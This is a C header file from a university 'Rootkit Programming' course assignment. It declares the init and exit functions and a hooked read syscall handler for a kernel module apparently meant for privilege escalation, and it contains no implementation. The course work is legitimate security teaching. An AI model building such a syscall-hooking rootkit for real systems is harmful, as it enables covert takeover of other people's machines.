
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: privil_escalation.h                                             */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage: Header file for module `privil_escalation.c`                       */
/*                                                                             */
/*******************************************************************************/

#ifndef __PRIVIL_ESCALATION__
#define __PRIVIL_ESCALATION__


/* Declaration of functions */
int privil_escalation_init(int);
int privil_escalation_exit(void);

asmlinkage long privil_escalation_read_syscall(unsigned int, char __user *, size_t);

#endif
